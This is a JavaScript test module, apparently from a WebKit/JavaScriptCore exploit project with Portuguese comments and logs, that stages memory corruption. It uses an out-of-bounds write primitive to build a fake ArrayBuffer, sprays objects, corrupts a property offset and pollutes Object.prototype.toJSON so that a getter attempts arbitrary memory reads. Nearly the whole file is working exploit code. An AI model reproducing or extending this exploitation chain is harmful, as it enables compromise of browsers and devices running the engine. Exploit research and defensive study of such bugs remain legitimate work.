// js/script3/testFakeABViaCorruptOffset.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_PROPERTY_NAME = "AAAA_GetterForFakeABCheckViaOffset";
let getter_last_call_results = {};

class CheckpointObjectForFakeAB {
    constructor(id) {
        this.id = `CheckpointObj_FakeAB-${id}`;
        this.marker = 0xABCDEF00;
        this.prop_to_corrupt_with_offset = null; // Alvo da corrupção para conter o offset do Fake AB
    }
}

Object.defineProperty(CheckpointObjectForFakeAB.prototype, GETTER_PROPERTY_NAME, {
    get: function() {
        const GETTER_FNAME = "CheckpointObjectForFakeAB.Getter";
        logS3(`!!!! GETTER '${GETTER_PROPERTY_NAME}' FOI CHAMADO !!!! (ID: ${this.id})`, "vuln", GETTER_FNAME);
        this.marker = 0xB00B1E55; // Indicar chamada

        getter_last_call_results = {
            id_in_getter: this.id,
            prop_offset_value: this.prop_to_corrupt_with_offset,
            prop_offset_type: typeof this.prop_to_corrupt_with_offset,
            expected_fake_ab_offset: "N/A", // Será preenchido pelo teste principal
            read_from_fake_ab_data_ptr: "N/A",
            read_from_fake_ab_size: "N/A",
            arbitrary_read_value: "N/A",
            arbitrary_read_error: null,
            success: false
        };

        const expected_offset = getter_last_call_results.expected_fake_ab_offset; // Definido pelo chamador
        logS3(`   [${GETTER_FNAME}] this.prop_to_corrupt_with_offset: ${toHex(this.prop_to_corrupt_with_offset)} (typeof: ${typeof this.prop_to_corrupt_with_offset}). Esperado: ${toHex(expected_offset)}`, "info", GETTER_FNAME);

        if (typeof this.prop_to_corrupt_with_offset === 'number' && this.prop_to_corrupt_with_offset === expected_offset) {
            logS3(`   [${GETTER_FNAME}] SUCESSO ESPECULATIVO! prop_to_corrupt_with_offset (${toHex(this.prop_to_corrupt_with_offset)}) corresponde ao offset do Fake AB!`, "leak", GETTER_FNAME);

            try {
                const fake_ab_base = this.prop_to_corrupt_with_offset;
                const data_ptr_offset_in_fake_ab = parseInt(JSC_OFFSETS.ArrayBuffer.DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START, 16);
                const size_offset_in_fake_ab = parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16);

                logS3(`     Lendo m_dataPointer do Fake AB em oob_content[${toHex(fake_ab_base + data_ptr_offset_in_fake_ab)}]...`, "info", GETTER_FNAME);
                const actual_data_ptr_adv64 = oob_read_absolute(fake_ab_base + data_ptr_offset_in_fake_ab, 8);
                getter_last_call_results.read_from_fake_ab_data_ptr = actual_data_ptr_adv64.toString(true);
                logS3(`       Fake AB m_dataPointer lido: ${actual_data_ptr_adv64.toString(true)}`, "leak", GETTER_FNAME);

                logS3(`     Lendo m_sizeInBytes do Fake AB em oob_content[${toHex(fake_ab_base + size_offset_in_fake_ab)}]...`, "info", GETTER_FNAME);
                const actual_size_val = oob_read_absolute(fake_ab_base + size_offset_in_fake_ab, 4); // Tamanho é DWORD
                getter_last_call_results.read_from_fake_ab_size = toHex(actual_size_val);
                logS3(`       Fake AB m_sizeInBytes lido: ${toHex(actual_size_val)}`, "leak", GETTER_FNAME);

                if (actual_size_val > 0) {
                    logS3(`     Tentando leitura arbitrária em ${actual_data_ptr_adv64.toString(true)} com tamanho ${toHex(actual_size_val)} (lendo min(4, size))...`, "info", GETTER_FNAME);
                    const arbitrary_val = oob_read_absolute(actual_data_ptr_adv64, Math.min(4, actual_size_val));
                    getter_last_call_results.arbitrary_read_value = toHex(arbitrary_val);
                    logS3(`       LEITURA ARBITRÁRIA (via Fake AB): *(${actual_data_ptr_adv64.toString(true)}) = ${toHex(arbitrary_val)}`, "critical", GETTER_FNAME);
                    getter_last_call_results.success = true;
                    document.title = "SUCCESS: Arbitrary Read via Fake AB Offset!";
                } else {
                    logS3(`       Tamanho lido do Fake AB é 0 ou inválido. Leitura arbitrária não tentada.`, "warn", GETTER_FNAME);
                }
            } catch (e_read_fake) {
                logS3(`     ERRO ao ler/usar campos do Fake AB: ${e_read_fake.name} - ${e_read_fake.message}`, "error", GETTER_FNAME);
                getter_last_call_results.arbitrary_read_error = `${e_read_fake.name}: ${e_read_fake.message}`;
            }
        } else {
            logS3(`   [${GETTER_FNAME}] prop_to_corrupt_with_offset não corresponde ao offset esperado do Fake AB.`, "info", GETTER_FNAME);
        }
        return "getter_fake_ab_check_done";
    },
    configurable: true,
    enumerable: true
});

// toJSON que aciona o getter no CheckpointObjectForFakeAB
export function toJSON_TriggerCheckpointForFakeABOffset() {
    const FNAME_toJSON = "toJSON_TriggerCheckpointForFakeABOffset";
    let returned_payload = { _variant_: FNAME_toJSON, _id_at_entry_: String(this?.id || "N/A") };
    try {
        for (const prop in this) { // Este loop, e o acesso subsequente por JSON.stringify, aciona o getter
            if (Object.prototype.hasOwnProperty.call(this, prop) || CheckpointObjectForFakeAB.prototype.hasOwnProperty(prop)) {
                if (prop === GETTER_PROPERTY_NAME || prop === 'id' || prop === 'marker') { // Tocar no getter e outras props
                    returned_payload[prop] = this[prop];
                }
            }
        }
    } catch (e) { returned_payload._ERROR_IN_LOOP_ = `${e.name}: ${e.message}`; }
    return returned_payload;
}

export async function executeFakeABViaCorruptOffsetTest() {
    const FNAME_TEST = "executeFakeABViaCorruptOffsetTest";
    logS3(`--- Iniciando Teste: Fake AB via Corrupção de Offset em Propriedade ---`, "test", FNAME_TEST);
    document.title = `Fake AB via Corrupt Prop Offset`;

    // Validações de Config
    if (!JSC_OFFSETS.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID || JSC_OFFSETS.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID !== 2) {
        logS3(`ERRO CRÍTICO: ArrayBuffer_STRUCTURE_ID não é 2 em config.mjs.`, "error", FNAME_TEST); return;
    }
    const required_ab_offsets = ["STRUCTURE_POINTER_OFFSET", "SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START", "DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START"];
    for (const offset_name of required_ab_offsets) {
        if (JSC_OFFSETS.ArrayBuffer[offset_name] === undefined && JSC_OFFSETS.JSCell[offset_name] === undefined ) {
             logS3(`ERRO CRÍTICO: Offset ${offset_name} não definido em config.mjs.`, "error", FNAME_TEST); return;
        }
    }

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha ao configurar ambiente OOB. Teste abortado.", "error", FNAME_TEST); return;
    }

    // 1. Construir o JSArrayBuffer Falso Simplificado no conteúdo do oob_array_buffer_real
    const FAKE_JSARRAYBUFFER_CONTENT_OFFSET = 0x300; // Onde nosso JSArrayBuffer falso começa no conteúdo do oob_array_buffer_real
    const TARGET_ARBITRARY_READ_ADDRESS = new AdvancedInt64("0x0002000000000000"); // Endereço de leitura alvo
    const ARBITRARY_READ_SIZE = 0x100; // Tamanho da leitura alvo (256 bytes)

    logS3(`1. Construindo JSArrayBuffer Falso em oob_content[${toHex(FAKE_JSARRAYBUFFER_CONTENT_OFFSET)}]...`, "info", FNAME_TEST);
    try {
        const struct_id_val = JSC_OFFSETS.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID;
        const struct_ptr_off = parseInt(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET, 16);
        const size_off = parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16);
        const data_ptr_off = parseInt(JSC_OFFSETS.ArrayBuffer.DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START, 16);

        oob_write_absolute(FAKE_JSARRAYBUFFER_CONTENT_OFFSET + 0x0, struct_id_val, 4);
        oob_write_absolute(FAKE_JSARRAYBUFFER_CONTENT_OFFSET + struct_ptr_off, AdvancedInt64.Zero, 8);
        oob_write_absolute(FAKE_JSARRAYBUFFER_CONTENT_OFFSET + size_off, ARBITRARY_READ_SIZE, 4);
        oob_write_absolute(FAKE_JSARRAYBUFFER_CONTENT_OFFSET + data_ptr_off, TARGET_ARBITRARY_READ_ADDRESS, 8);
        logS3(`   JSArrayBuffer Falso construído. Target Addr: ${TARGET_ARBITRARY_READ_ADDRESS.toString(true)}, Size: ${toHex(ARBITRARY_READ_SIZE)}`, "good", FNAME_TEST);
    } catch (e_build) {
        logS3(`   ERRO ao construir JSArrayBuffer Falso: ${e_build.message}`, "error", FNAME_TEST);
        clearOOBEnvironment(); return;
    }

    // 2. Pulverizar CheckpointObjectForFakeAB
    const spray_count = 50;
    const sprayed_checkpoints = [];
    logS3(`2. Pulverizando ${spray_count} instâncias de CheckpointObjectForFakeAB...`, "info", FNAME_TEST);
    for (let i = 0; i < spray_count; i++) {
        sprayed_checkpoints.push(new CheckpointObjectForFakeAB(i));
    }
    logS3(`   Pulverização de ${sprayed_checkpoints.length} objetos concluída.`, "good", FNAME_TEST);

    await PAUSE_S3(SHORT_PAUSE_S3);

    // 3. Realizar a corrupção OOB "gatilho" que esperamos que corrompa 'prop_to_corrupt_with_offset'
    const corruption_offset_trigger = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    // O valor que queremos que seja escrito na propriedade do CheckpointObject é FAKE_JSARRAYBUFFER_CONTENT_OFFSET
    const value_to_write_for_corruption = FAKE_JSARRAYBUFFER_CONTENT_OFFSET; // ex: 0x300
    logS3(`3. Escrevendo valor de offset ${toHex(value_to_write_for_corruption)} em oob_ab_real[${toHex(corruption_offset_trigger)}]...`, "warn", FNAME_TEST);
    // Assumindo que o campo da propriedade no CheckpointObject é um DWORD para conter o offset.
    oob_write_absolute(corruption_offset_trigger, value_to_write_for_corruption, 4);

    await PAUSE_S3(SHORT_PAUSE_S3);

    // 4. Poluir Object.prototype.toJSON e tentar acionar o getter
    const ppKey_val = 'toJSON';
    let originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let toJSONPollutionApplied = false;
    let final_success = false;

    getter_last_call_results.expected_fake_ab_offset = FAKE_JSARRAYBUFFER_CONTENT_OFFSET; // Informar o getter

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_TriggerCheckpointForFakeABOffset,
            writable: true, configurable: true, enumerable: false
        });
        toJSONPollutionApplied = true;
        logS3(`4. Object.prototype.toJSON poluído com ${toJSON_TriggerCheckpointForFakeABOffset.name}.`, "info", FNAME_TEST);

        const obj_to_probe = sprayed_checkpoints[0]; // Testar o primeiro objeto pulverizado
        logS3(`5. Sondando objeto ${obj_to_probe.id}... ESPERANDO ACIONAMENTO DO GETTER.`, 'warn', FNAME_TEST);
        document.title = `Sondando ${obj_to_probe.id} (FakeABOffset)`;
        try {
            const stringifyResult = JSON.stringify(obj_to_probe);
            logS3(`   JSON.stringify(${obj_to_probe.id}) completou. Retorno toJSON: ${JSON.stringify(stringifyResult)}`, "info", FNAME_TEST);

        } catch (e_str) {
            logS3(`   !!!! ERRO AO STRINGIFY ${obj_to_probe.id} !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
            document.title = `ERROR Stringify ${obj_to_probe.id}`;
        }
    } catch (e_main) {
        logS3(`Erro principal no teste: ${e_main.message}`, "error", FNAME_TEST);
    } finally {
        if (toJSONPollutionApplied) {
            if (originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc);
            else delete Object.prototype[ppKey_val];
        }
    }

    // Analisar resultados do getter
    if (getter_last_call_results.id_in_getter) {
        logS3("--- RESULTADOS DO GETTER ---", "test", FNAME_TEST);
        logS3(JSON.stringify(getter_last_call_results, null, 2), "leak", FNAME_TEST);
        if (getter_last_call_results.success) {
            logS3("   !!!! SUCESSO NA LEITURA ARBITRÁRIA VIA OFFSET CORROMPIDO E FAKE AB !!!!", "critical", FNAME_TEST);
            final_success = true;
        } else if (getter_last_call_results.prop_offset_value === FAKE_JSARRAYBUFFER_CONTENT_OFFSET) {
            logS3("   Offset da propriedade foi corrompido corretamente, mas a leitura arbitrária falhou.", "warn", FNAME_TEST);
        } else {
            logS3("   Offset da propriedade não foi corrompido como esperado.", "warn", FNAME_TEST);
        }
    } else {
        logS3("Getter não parece ter sido chamado ou falhou em registrar resultados.", "warn", FNAME_TEST);
    }

    clearOOBEnvironment();
    logS3(`--- Teste Fake AB via Corrupção de Offset em Propriedade CONCLUÍDO ---`, "test", FNAME_TEST);
    if (final_success) {
        // Manter título de sucesso
    } else if (document.title.includes("ERROR")) {
        // Manter
    } else {
        document.title = `FakeAB via Corrupt Prop Offset Done`;
    }
}
